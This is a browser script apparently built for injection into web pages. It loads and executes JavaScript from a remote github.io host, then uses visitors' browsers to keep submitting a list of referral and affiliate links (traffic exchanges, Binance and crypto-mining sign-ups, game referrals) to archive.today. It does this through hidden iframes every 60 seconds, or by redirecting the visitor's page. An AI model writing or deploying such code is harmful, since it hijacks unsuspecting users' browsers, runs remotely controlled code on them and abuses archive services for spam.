<script>
/* Injects a stealthIFrameContainer into the current page (no need for a manual <div>)
   Supports random submissions to web.archive.org, ghostarchive.org, and archive.today.
*/

const fetchData = [
    "https://amf.ac/?SZ8JCOJL",
    "https://addmefast.com/?ref=SZ8JCOJL",
    "http://folllike.com/?19384926",
    "https://www.followlike.info/?r=19384926",
    "https://www.followlike.net/?r=19384926",
    "http://folllike.com/?19265371",
    "https://www.followlike.info/?r=19265371",
    "https://www.followlike.net/?r=19265371",
    "https://www.like4like.org/?ref=play2earn",
    "https://www.like4like.org/buy-instagram-likes.php?ref=play2earn",
    "https://www.like4like.org/?ref=new_account",
    "https://www.like4like.org/buy-instagram-likes.php?ref=new_account",
    "https://www.hit4hit.org/?ref=mart192a",
    "https://www.10khits.com/?ref=319049",
    "https://rankboostup.com/?refid=510070",
    "https://www.nice-autosurf.com/parrain-256003.html",
    "https://objectivesocial.com/?ref=392",
    "https://objectivecoin.com/?ref=22",
    "https://2pink.org/dang-ky?ref=119334",
    "https://livetraffic.net/login?refer=119334",
    "https://2pink.org/dang-ky?ref=123215",
    "https://livetraffic.net/login?refer=123215",
    "https://www.ytmonster.net/r/NewAccount",
    "https://www.followlike.info/splash.php?r=19384926",
    "https://www.followlike.info/splashvid.php?r=19384926",
    "https://www.followlike.net/splash.php?r=19384926",
    "https://www.followlike.net/splashvid.php?r=19384926",
    "https://ylkhts.cc/?id=3509858",
    "https://www.youlikehits.com/?id=3509858",
    "http://kingdomlikes.com/?ref=AMUaOjUA2J",
    "https://likestool.com/ref/5KLun5m",
    "https://www.linkcollider.com/page/register?r=544188&aff=1",
    "http://follow4follow.com/?ref=235864",
    "https://bighits4u.com/by/wireconnected",
    "https://everve.net/ref/343736/",
    "https://gala.fan/_DfcsmvcqH",
    "https://games.gala.com/?r=6208e741d2be6c7234446e99",
    "https://games.gala.com/store/?r=6208e741d2be6c7234446e99",
    "https://games.gala.com/games/?r=6208e741d2be6c7234446e99",
    "https://games.gala.com/games/meowcoin?r=6208e741d2be6c7234446e99",
    "https://games.gala.com/games/town-star?r=6208e741d2be6c7234446e99",
    "https://games.gala.com/games/sweep-it-poker?r=6208e741d2be6c7234446e99",
    "https://games.gala.com/games/champions-arena?r=6208e741d2be6c7234446e99",
    "https://games.gala.com/games/dogs-for-the-founder?r=6208e741d2be6c7234446e99",
    "https://games.gala.com/games/treasure-tapper?r=6208e741d2be6c7234446e99",
    "https://games.gala.com/games/legends-reborn?r=6208e741d2be6c7234446e99",
    "https://games.gala.com/games/last-expedition?r=6208e741d2be6c7234446e99",
    "https://games.gala.com/games/eternal-paradox?r=6208e741d2be6c7234446e99",
    "https://games.gala.com/games/mirandus?r=6208e741d2be6c7234446e99",
    "https://games.gala.com/games/voyager?r=6208e741d2be6c7234446e99",
    "https://games.gala.com/games/echoes-of-empire?r=6208e741d2be6c7234446e99",
    "https://games.gala.com/games/legacy?r=6208e741d2be6c7234446e99",
    "https://games.gala.com/games/dragon-strike?r=6208e741d2be6c7234446e99",
    "https://games.gala.com/games/meow-match?r=6208e741d2be6c7234446e99",
    "https://games.gala.com/games/superior?r=6208e741d2be6c7234446e99",
    "https://games.gala.com/games/vexi-villages?r=6208e741d2be6c7234446e99",
    "https://games.gala.com/games/sweepstakes?r=6208e741d2be6c7234446e99",
    "https://gala.fan/0iaLD2wnw",
    "https://music.gala.com/?referralCode=6208e741d2be6c7234446e99",
    "https://film.gala.com?referralCode=6208e741d2be6c7234446e99",
    "https://gala.fan/1oX_idoyE",
    "https://connect.gala.com/?r=6208e741d2be6c7234446e99",
    "https://connect.gala.com/referrals?r=6208e741d2be6c7234446e99",
    "https://connect.gala.com/tokens/all?r=6208e741d2be6c7234446e99",
    "https://connect.gala.com/swap?r=6208e741d2be6c7234446e99",
    "https://connect.gala.com/create?ot=GALA|Unit|none|none&r=6208e741d2be6c7234446e99",
    "https://connect.gala.com/send?r=6208e741d2be6c7234446e99",
    "https://connect.gala.com/receive?r=6208e741d2be6c7234446e99",
    "https://connect.gala.com/bridge/ethereum/galachain?r=6208e741d2be6c7234446e99",
    "https://connect.gala.com/wrap?r=6208e741d2be6c7234446e99",
    "https://9hits.com/?ref=60172",
    "https://9hits.com/?ref=272922",
    "https://cryptotab.farm/00MCLLIQ",
    "https://cryptotab.farm/pool-miners/00MCLLIQ",
    "https://cryptotab.farm/miner/00MCLLIQ",
    "http://adfoc.us/?refid=505540",
    "https://adfly.site/ref/trafficexchange",
    "https://publisher.linkvertise.com/ac/80814",
    "http://ouo.io/ref/3qJMauYy",
    "http://warthunder.com/en/registration?r=userinvite_4744825",
    "https://www.binance.com/referral/earn-together/refer2earn-usdc/claim?hl=en&ref=GRO_28502_00ZGI&utm_source=referral_entrance",
    "https://www.binance.com/activity/referral-entry/CPA?ref=CPA_00A5FLAQ8F",
    "https://accounts.binance.com/register?ref=86018780",
    "https://www.binance.com/referral/earn-together/refer2earn-usdc/claim?hl=en&ref=GRO_28502_CKEJN",
    "https://www.binance.com/activity/referral-entry/CPA?ref=CPA_00FOKEN3OB",
    "https://accounts.binance.com/register?ref=1107711283"
];
const fetchURLs = [
	"https://backlink-generator-tool.github.io/url-dump-json/script/fetch/js/query2ai.js"
	/*
	"https://backlink-generator-tool.github.io/url-dump-json/script/fetch/js/pinterest-boards.js",
	"https://backlink-generator-tool.github.io/url-dump-json/script/fetch/js/query2ai.js"
	*/
	/*
	"https://backlink-generator-tool.github.io/url-dump-json/script/fetch/js/pinterest-pins.js",
	"https://backlink-generator-tool.github.io/url-dump-json/script/fetch/js/pinterest-boards.js",
	"https://backlink-generator-tool.github.io/url-dump-json/script/fetch/js/query2ai.js",
	"https://backlink-generator-tool.github.io/url-dump-json/script/fetch/js/query2ai-pinterest-boards.js"
	"https://backlink-generator-tool.github.io/url-dump-json/script/fetch/js/query2ai-pinterest-pins.js"
	*/
];

const IFRAME_COUNT = 8;
const SUBMIT_INTERVAL = 60000; // 60s

function isValidURL(url) {
  const pattern = /^https?:\/\/[^\s]+$/i;
  return pattern.test(url);
}
function shuffle(array){ for(let i=array.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[array[i],array[j]]=[array[j],array[i]];} }
function normalizeURL(url){ if(typeof url!=='string') return ""; return url.replace(/([^:]\/)\/+/g,"$1"); }
function randomURL(array){ return array[Math.floor(Math.random()*array.length)]; }

/* ============================================================
     ðŸ”¥ HARDENED updateDefaultURLs() â€” robust JS + JSON support
   ============================================================ */
async function updateDefaultURLs() {
  // small sleep helper
  const wait = (ms) => new Promise(res => setTimeout(res, ms));

  // import module from text using blob URL
  async function importModuleFromText(jsText) {
    const blob = new Blob([jsText], { type: 'application/javascript' });
    const blobUrl = URL.createObjectURL(blob);
    try {
      return await import(blobUrl);
    } finally {
      URL.revokeObjectURL(blobUrl);
    }
  }

  // extract possible arrays from JSON payloads
  function extractFromJSON(data) {
    if (Array.isArray(data)) return data.slice();
    for (const key of ['urls','items','data','list']) {
      if (Array.isArray(data?.[key])) return data[key].slice();
    }
    // fallback: first array property
    if (data && typeof data === 'object') {
      for (const k of Object.keys(data)) if (Array.isArray(data[k])) return data[k].slice();
    }
    return [];
  }

  // extract arrays from imported modules (common shapes)
  async function extractFromModule(mod) {
    if (!mod) return [];
    if (Array.isArray(mod.default)) return mod.default.slice();
    for (const key of ['urls','items','data','list','pins','pinIds']) {
      if (Array.isArray(mod[key])) return mod[key].slice();
    }
    for (const fn of ['build','load','get']) {
      if (typeof mod[fn] === 'function') {
        try {
          const out = await mod[fn]();
          if (Array.isArray(out)) return out.slice();
        } catch(e){ /* ignore and continue */ }
      }
    }
    return [];
  }

  // script fallback that waits for globals, an event, or a promise provided by the producer
  async function loadViaScriptAndWait(url, { timeout = 4000, pollInterval = 100 } = {}) {
    const GLOBAL_KEYS = [
      "REMOTE_URLS","REMOTE_DATA","REMOTE_ARRAY",
      "FETCH_JS_DATA","FETCH_DATA",
      "urls","items","pins","PIN_IDS"
    ];

    return new Promise((resolve) => {
      let script = document.createElement('script');
      script.async = true;
      script.src = url;

      let finished = false;
      let timer = null;

      // Handler for producer event
      function onProducerEvent(e) {
        if (finished) return;
        finished = true;
        cleanup();
        const urls = (e && e.detail && Array.isArray(e.detail.urls)) ? e.detail.urls.slice() : [];
        resolve(urls);
      }

      // Polling after onload to detect globals
      function startPolling() {
        const start = Date.now();
        (function poll() {
          if (finished) return;
          // check for window.FETCH_JS_READY promise first
          if (window.FETCH_JS_READY instanceof Promise) {
            // try to await it (but not block poll)
            window.FETCH_JS_READY.then((res) => {
              if (finished) return;
              finished = true;
              cleanup();
              if (Array.isArray(res)) return resolve(res.slice());
              // otherwise fallthrough to check globals
            }).catch(() => {});
          }
          // check known globals
          for (const k of GLOBAL_KEYS) {
            const val = window[k];
            if (Array.isArray(val) && val.length) {
              finished = true;
              cleanup();
              return resolve(val.slice());
            }
          }
          if (Date.now() - start >= timeout) {
            finished = true;
            cleanup();
            return resolve([]); // timed out
          }
          setTimeout(poll, pollInterval);
        })();
      }

      function cleanup() {
        try { window.removeEventListener('remoteUrlsReady', onProducerEvent); } catch(e){}
        if (timer) { clearTimeout(timer); timer = null; }
        try { if (script && script.parentNode) script.parentNode.removeChild(script); } catch(e){}
      }

      script.onerror = () => {
        if (finished) return;
        finished = true;
        cleanup();
        resolve([]);
      };

      script.onload = () => {
        // producer might dispatch 'remoteUrlsReady' or set FETCH_JS_READY or globals.
        // start polling to catch them.
        startPolling();
      };

      window.addEventListener('remoteUrlsReady', onProducerEvent, { once: true });
      document.head.appendChild(script);

      // As a safety, ensure we resolve after an absolute timeout even if onload never fires.
      timer = setTimeout(() => {
        if (finished) return;
        finished = true;
        cleanup();
        resolve([]);
      }, timeout + 1000);
    });
  }

/**
 * updateDefaultURLs(fetchURLs, fetchData, options)
 *
 * Uses localStorage for small payloads and IndexedDB for larger payloads.
 *
 * Options:
 *  - cacheKeyPrefix: string
 *  - ttlMs: number
 *  - sizeThreshold: number (bytes) -- above this use IndexedDB by default (default 200k)
 *  - shuffle: boolean
 *  - forceNetwork: boolean
 *  - backgroundRefresh: boolean
 *  - fetchOptions: object passed to fetch
 *
 * Returns: Promise<void>
 */
async function updateDefaultURLs(fetchURLs, fetchData, options = {}) {
  if (!Array.isArray(fetchURLs) || fetchURLs.length === 0) {
    throw new Error("updateDefaultURLs: fetchURLs must be a non-empty array");
  }
  if (!Array.isArray(fetchData)) {
    throw new Error("updateDefaultURLs: fetchData must be an array (will be mutated in-place)");
  }

  const {
    cacheKeyPrefix = "updateDefaultURLs_cache_v1_",
    ttlMs = 24 * 60 * 60 * 1000,
    sizeThreshold = 200 * 1024, // 200 KB default threshold to prefer IndexedDB
    shuffle = true,
    forceNetwork = false,
    backgroundRefresh = true,
    fetchOptions = { cache: "no-store" }
  } = options;

  // deterministic DJB2 hash for cache key
  function djb2Hash(str) {
    let h = 5381;
    for (let i = 0; i < str.length; i++) {
      h = ((h << 5) + h) + str.charCodeAt(i);
      h = h & 0xFFFFFFFF;
    }
    return (h >>> 0).toString(16);
  }
  function makeCacheKey(urls) {
    return cacheKeyPrefix + djb2Hash(JSON.stringify(urls));
  }
  const CACHE_KEY = makeCacheKey(fetchURLs);

  // ---------- storage availability checks ----------
  function localStorageAvailable() {
    try {
      const test = "__ls_test__" + Math.random();
      localStorage.setItem(test, test);
      localStorage.removeItem(test);
      return true;
    } catch (e) {
      return false;
    }
  }

  // ---------- IndexedDB wrapper ----------
  const IDB_DB_NAME = "updateDefaultURLs_IDB_v1";
  const IDB_STORE_NAME = "cache";

  function openIDB() {
    return new Promise((resolve, reject) => {
      if (!("indexedDB" in window)) return reject(new Error("IndexedDB not supported"));
      const req = indexedDB.open(IDB_DB_NAME, 1);
      req.onupgradeneeded = (ev) => {
        const db = ev.target.result;
        if (!db.objectStoreNames.contains(IDB_STORE_NAME)) {
          db.createObjectStore(IDB_STORE_NAME, { keyPath: "key" });
        }
      };
      req.onsuccess = () => resolve(req.result);
      req.onerror = () => reject(req.error || new Error("IndexedDB open error"));
    });
  }

  async function idbGet(key) {
    try {
      const db = await openIDB();
      return await new Promise((res, rej) => {
        const tx = db.transaction(IDB_STORE_NAME, "readonly");
        const store = tx.objectStore(IDB_STORE_NAME);
        const r = store.get(key);
        r.onsuccess = () => res(r.result ? r.result.value : null);
        r.onerror = () => rej(r.error || new Error("idb get error"));
      });
    } catch (err) {
      // propagate error upward
      throw err;
    }
  }

  async function idbSet(key, value) {
    try {
      const db = await openIDB();
      return await new Promise((res, rej) => {
        const tx = db.transaction(IDB_STORE_NAME, "readwrite");
        const store = tx.objectStore(IDB_STORE_NAME);
        const obj = { key, value };
        const r = store.put(obj);
        r.onsuccess = () => res(true);
        r.onerror = () => rej(r.error || new Error("idb set error"));
      });
    } catch (err) {
      throw err;
    }
  }

  async function idbDelete(key) {
    try {
      const db = await openIDB();
      return await new Promise((res, rej) => {
        const tx = db.transaction(IDB_STORE_NAME, "readwrite");
        const store = tx.objectStore(IDB_STORE_NAME);
        const r = store.delete(key);
        r.onsuccess = () => res(true);
        r.onerror = () => rej(r.error || new Error("idb delete error"));
      });
    } catch (err) {
      throw err;
    }
  }

  // ---------- localStorage helpers ----------
  function lsGet(key) {
    try {
      const raw = localStorage.getItem(key);
      if (!raw) return null;
      return JSON.parse(raw);
    } catch (err) {
      // Could be quota or parse error
      throw err;
    }
  }
  function lsSet(key, obj) {
    try {
      const raw = JSON.stringify(obj);
      localStorage.setItem(key, raw);
      return true;
    } catch (err) {
      throw err;
    }
  }
  function lsDelete(key) {
    try {
      localStorage.removeItem(key);
      return true;
    } catch (err) {
      return false;
    }
  }

  // ---------- utility ----------
  function populateFetchData(arr) {
    fetchData.length = 0;
    fetchData.push(...arr);
  }
  function shuffleArray(arr) {
    const a = arr.slice();
    for (let i = a.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [a[i], a[j]] = [a[j], a[i]];
    }
    return a;
  }

  async function fetchFromNetwork(urlList) {
    for (const u of urlList) {
      try {
        const r = await fetch(u, fetchOptions);
        if (!r.ok) throw new Error("HTTP " + r.status);
        const data = await r.json();
        if (Array.isArray(data)) return { data, source: u };
        // if not array, continue
      } catch (err) {
        // try next
      }
    }
    throw new Error("All network fetches failed");
  }

  // ---------- higher-level cache read/write that auto-chooses storage ----------
  async function readCache() {
    // Prefer localStorage if available (fast) â€” but we'll also try IndexedDB if needed.
    const lsAvailable = localStorageAvailable();
    if (lsAvailable) {
      try {
        const payload = lsGet(CACHE_KEY);
        if (payload) return { payload, storage: "localStorage" };
      } catch (err) {
        // reading/parsing may fail -> try idb next
      }
    }
    // try IndexedDB
    try {
      const value = await idbGet(CACHE_KEY);
      if (value) return { payload: value, storage: "indexedDB" };
    } catch (err) {
      // idb may not be available or might error
    }
    return null;
  }

  async function writeCache(payloadObj) {
    // payloadObj must be serializable JSON-compatible
    const serialized = JSON.stringify(payloadObj);
    const sizeBytes = new Blob([serialized]).size;

    // strategy:
    // - if size <= sizeThreshold, prefer localStorage, else prefer idb
    // - if preferred fails, fallback to the other
    const lsAvailable = localStorageAvailable();
    const wantsIDB = sizeBytes > sizeThreshold;

    if (!wantsIDB && lsAvailable) {
      try {
        lsSet(CACHE_KEY, payloadObj);
        return { storage: "localStorage", sizeBytes };
      } catch (err) {
        // if LS fails (quota, disabled), try IDB
      }
    }

    // Try IndexedDB
    try {
      await idbSet(CACHE_KEY, payloadObj);
      return { storage: "indexedDB", sizeBytes };
    } catch (err) {
      // IDB failed -> fallback to LS if available
    }

    // Last attempt: localStorage even if large (may fail)
    if (lsAvailable) {
      try {
        lsSet(CACHE_KEY, payloadObj);
        return { storage: "localStorage", sizeBytes };
      } catch (err) {
        // give up
      }
    }

    throw new Error("No storage available for cache");
  }

  async function deleteCache() {
    const lsAvailable = localStorageAvailable();
    if (lsAvailable) {
      try { lsDelete(CACHE_KEY); } catch (e) {}
    }
    try { await idbDelete(CACHE_KEY); } catch (e) {}
  }

  // expose clearCacheFor as property on function (optional)
  updateDefaultURLs.clearCacheFor = async function(fetchURLsToClear) {
    const k = makeCacheKey(fetchURLsToClear);
    try { if (localStorageAvailable()) localStorage.removeItem(k); } catch (e) {}
    try {
      await idbDelete(k);
    } catch (e) {}
  };

  // ---------- main logic ----------
  const now = Date.now();
  const cacheEntry = !forceNetwork ? await (async () => {
    try { return await readCache(); } catch (e) { return null; }
  })() : null;

  if (cacheEntry && cacheEntry.payload && Array.isArray(cacheEntry.payload.data)) {
    const cached = cacheEntry.payload;
    const age = now - (cached.ts || 0);
    populateFetchData(cached.data);

    if (age < ttlMs) {
      if (backgroundRefresh && age > ttlMs / 2) {
        (async () => {
          try {
            const urlList = shuffle ? shuffleArray(fetchURLs) : fetchURLs.slice();
            const net = await fetchFromNetwork(urlList);
            const payload = { ts: Date.now(), data: net.data, meta: { source: net.source } };
            try { await writeCache(payload); } catch (e) {}
            populateFetchData(net.data);
          } catch (e) {}
        })();
      }
      return;
    }

    // Cache expired: try immediate refresh; if network fails keep expired cache
    try {
      const urlList = shuffle ? shuffleArray(fetchURLs) : fetchURLs.slice();
      const net = await fetchFromNetwork(urlList);
      const payload = { ts: Date.now(), data: net.data, meta: { source: net.source } };
      try { await writeCache(payload); } catch (e) {}
      populateFetchData(net.data);
      return;
    } catch (err) {
      // network failed - keep expired cache
      return;
    }
  }

  // No usable cache or forced network -> fetch from network
  try {
    const urlList = shuffle ? shuffleArray(fetchURLs) : fetchURLs.slice();
    const net = await fetchFromNetwork(urlList);
    const payload = { ts: Date.now(), data: net.data, meta: { source: net.source } };
    try { await writeCache(payload); } catch (e) {}
    populateFetchData(net.data);
    return;
  } catch (err) {
    // network failed and no cache -> leave fetchData as-is
    return;
  }
}

  // Keep original behavior of trying each URL in order (shuffled)
  shuffle(fetchURLs);

  for (const u of fetchURLs) {
    try {
      console.log("ðŸ”Ž Trying to fetch URL list from:", u);
      const path = u.split('?')[0].toLowerCase();

      // 1) JSON path (exact original behavior)
      if (path.endsWith('.json')) {
        try {
          const r = await fetch(u);
          if (!r.ok) throw new Error('HTTP ' + r.status);
          const json = await r.json();
          const arr = extractFromJSON(json);
          if (arr.length) {
            fetchData.length = 0;
            fetchData.push(...arr);
            console.log('âœ… Loaded', arr.length, 'URLs from JSON:', u);
            return;
          } else {
            console.warn('âš  JSON fetched but no array found:', u);
            continue;
          }
        } catch (e) {
          console.warn('âš  JSON fetch failed:', u, e && e.message);
          continue;
        }
      }

      // 2) JS / MJS path: try module import first, then script fallback
      if (path.endsWith('.js') || path.endsWith('.mjs')) {
        // Try module (requires CORS)
        let triedModule = false;
        try {
          triedModule = true;
          const r = await fetch(u);
          if (r.ok) {
            const txt = await r.text();
            try {
              const mod = await importModuleFromText(txt);
              const arr = await extractFromModule(mod);
              if (arr.length) {
                fetchData.length = 0;
                fetchData.push(...arr);
                console.log('âœ… Loaded', arr.length, 'URLs from JS module:', u);
                return;
              } else {
                console.warn('âš  Module imported but exported no usable array:', u);
              }
            } catch (imErr) {
              console.warn('âš  Module import failed (will fallback to script):', u, imErr && imErr.message);
            }
          } else {
            console.warn('âš  Fetching JS text failed (HTTP):', u);
          }
        } catch (e) {
          if (triedModule) console.warn('âš  Fetch for module text failed, will fallback to script:', u, e && e.message);
        }

        // Script fallback with retries/backoff
        try {
          const ATTEMPTS = 3;
          let final = [];
          for (let attempt = 1; attempt <= ATTEMPTS; attempt++) {
            if (attempt > 1) await wait((attempt - 1) * 250);
            const arr = await loadViaScriptAndWait(u, { timeout: 2000 + attempt * 1000, pollInterval: 120 });
            if (Array.isArray(arr) && arr.length) { final = arr; break; }
          }
          if (final.length) {
            fetchData.length = 0;
            fetchData.push(...final);
            console.log('âœ… Loaded', final.length, 'URLs from JS script (fallback):', u);
            return;
          } else {
            console.warn('âš  JS script fallback returned no data after retries:', u);
            continue;
          }
        } catch (e) {
          console.warn('âš  Script fallback error for', u, e && e.message);
          continue;
        }
      }

      // 3) Unknown extension: try JSON then JS fallback
      try {
        const r = await fetch(u);
        if (r.ok) {
          const maybeJson = await r.json().catch(()=>null);
          const arr = extractFromJSON(maybeJson);
          if (arr.length) {
            fetchData.length = 0;
            fetchData.push(...arr);
            console.log('âœ… Loaded', arr.length, 'URLs from fallback JSON:', u);
            return;
          }
        }
      } catch(_) {}

      // fallback script attempt
      try {
        const arr = await loadViaScriptAndWait(u, { timeout: 3500 });
        if (Array.isArray(arr) && arr.length) {
          fetchData.length = 0;
          fetchData.push(...arr);
          console.log('âœ… Loaded', arr.length, 'URLs from fallback JS:', u);
          return;
        } else {
          console.warn('âš  Unknown resource had no usable data:', u);
        }
      } catch (e) {
        console.warn('âš  Unknown resource script fallback failed:', u, e && e.message);
      }

    } catch (err) {
      console.warn('âš  Failed to load', u, err && err.message);
    }
  }

  console.warn('âš  Using fallback URLs (no remote array loaded). fetchData length:', fetchData.length);
}

/* ============================================================
   (rest of your original code remains unchanged)
   ============================================================ */

function generateTargetURL() {
  if (!fetchData.length) return "";
  const combined = randomURL(fetchData);
  return normalizeURL(combined);
}

/* Archive site definitions */
const ARCHIVE_SITES = [
    [
        {
          name: "archive.today",
          action: "https://archive.today/submit/",
          method: "POST",
          inputName: "url",
          extraParams: { anyway: "1" }
        },
        {
          name: "archive.li",
          action: "https://archive.today/submit/",
          method: "POST",
          inputName: "url",
          extraParams: { anyway: "1" }
        },
        {
          name: "archive.vn",
          action: "https://archive.today/submit/",
          method: "POST",
          inputName: "url",
          extraParams: { anyway: "1" }
        },
        {
          name: "archive.fo",
          action: "https://archive.today/submit/",
          method: "POST",
          inputName: "url",
          extraParams: { anyway: "1" }
        },
        {
          name: "archive.md",
          action: "https://archive.today/submit/",
          method: "POST",
          inputName: "url",
          extraParams: { anyway: "1" }
        },
        {
          name: "archive.ph",
          action: "https://archive.today/submit/",
          method: "POST",
          inputName: "url",
          extraParams: { anyway: "1" }
        }
    ]
/*
    [
        {
          name: "Wayback",
          action: "https://web.archive.org/save",
          method: "POST",
          inputName: "url",
          extraParams: {}
        }
    ],
    [
        {
          name: "archive.today",
          action: "https://archive.today/submit/",
          method: "GET",
          inputName: "url",
          extraParams: { anyway: "1" }
        },
        {
          name: "archive.li",
          action: "https://archive.today/submit/",
          method: "GET",
          inputName: "url",
          extraParams: { anyway: "1" }
        },
        {
          name: "archive.vn",
          action: "https://archive.today/submit/",
          method: "GET",
          inputName: "url",
          extraParams: { anyway: "1" }
        },
        {
          name: "archive.fo",
          action: "https://archive.today/submit/",
          method: "GET",
          inputName: "url",
          extraParams: { anyway: "1" }
        },
        {
          name: "archive.md",
          action: "https://archive.today/submit/",
          method: "GET",
          inputName: "url",
          extraParams: { anyway: "1" }
        },
        {
          name: "archive.ph",
          action: "https://archive.today/submit/",
          method: "GET",
          inputName: "url",
          extraParams: { anyway: "1" }
        }
    ],
    [
        {
          name: "GhostArchive",
          //action: "https://ghostarchive.org/archive2",
          action: "https://ghostarchive.org/archive",
          method: "POST",
          inputName: "archive",
          extraParams: {}
        }
    ]
*/
	
];

function chooseRandomArchive() {
     const randomArray = ARCHIVE_SITES[Math.floor(Math.random() * ARCHIVE_SITES.length)];
     return randomArray[Math.floor(Math.random() * randomArray.length)];
}

function ensureContainer() {
  return document.body || document.documentElement;
}

function buildAndSubmitArchiveForm(site, targetUrl, targetFrameName) {
  if (!site || !targetUrl) return;
  try {
    const form = document.createElement("form");
    form.style.display = "none";
    form.method = site.method || "POST";
    form.action = site.action;
    if (targetFrameName) form.target = targetFrameName;
    else form.target = "_self";

    const urlInput = document.createElement("input");
    urlInput.type = (site.method === "GET") ? "text" : "hidden";
    urlInput.name = site.inputName || "url";
    urlInput.value = targetUrl;
    form.appendChild(urlInput);

    if (site.extraParams) {
      for (const [k, v] of Object.entries(site.extraParams)) {
        const inp = document.createElement("input");
        inp.type = "hidden";
        inp.name = k;
        inp.value = v;
        form.appendChild(inp);
      }
    }

    const container = ensureContainer();
    container.appendChild(form);
    console.log(`ðŸ“¨ Submitting to ${site.name} (${site.action}) via ${site.method} target=${form.target} url=${targetUrl}`);
    form.submit();
    setTimeout(() => { try { form.remove(); } catch(e){} }, 1000);
  } catch (err) {
    console.error("âŒ buildAndSubmitArchiveForm error:", err);
  }
}

function submitToArchiveInFrame(iframe) {
  try {
    const targetUrl = generateTargetURL();
    if (!targetUrl || !isValidURL(targetUrl)) {
      console.warn("âš  Skipping invalid target:", targetUrl);
      return;
    }
    const site = chooseRandomArchive();
    buildAndSubmitArchiveForm(site, targetUrl, iframe.name);
  } catch (err) {
    console.error("âŒ submitToArchiveInFrame error:", err);
  }
}

function createIframe(i, container) {
  try {
    const iframe = document.createElement("iframe");
    const fname = "hiddenFrame" + i;
    iframe.setAttribute("name", fname);
    iframe.setAttribute("id", fname);
    iframe.classList.add("hidden-iframe");
    iframe.style.width = "100%";
    iframe.style.height = "200px";
    iframe.style.border = "0";
    iframe.src = "about:blank";

    container.appendChild(iframe);

    setTimeout(() => submitToArchiveInFrame(iframe), 250);

    setInterval(() => {
      console.log("â± Interval firing for iframe:", fname);
      submitToArchiveInFrame(iframe);
    }, SUBMIT_INTERVAL);
  } catch (err) {
    console.error("âŒ createIframe error:", err);
  }
}

function submitToArchiveRedirect(url) {
  if (!url || !isValidURL(url)) {
    console.warn("âš  Invalid or empty URL for redirect submission:", url);
    return;
  }
  const site = chooseRandomArchive();
  buildAndSubmitArchiveForm(site, url, "_self");
}

function inIframe() {
  try {
    return window.self !== window.top;
  } catch (e) {
    return true;
  }
}

document.addEventListener('DOMContentLoaded', async () => {
  try {
    await updateDefaultURLs();
  } catch (e) {
    console.warn("updateDefaultURLs() failed:", e && e.message);
  }


  if (inIframe()) {
	const container = ensureContainer();
    for (let i = 0; i < IFRAME_COUNT; i++) {
      createIframe(i, container);
    }
  } else {
    submitToArchiveRedirect(generateTargetURL());
  }
});
</script>
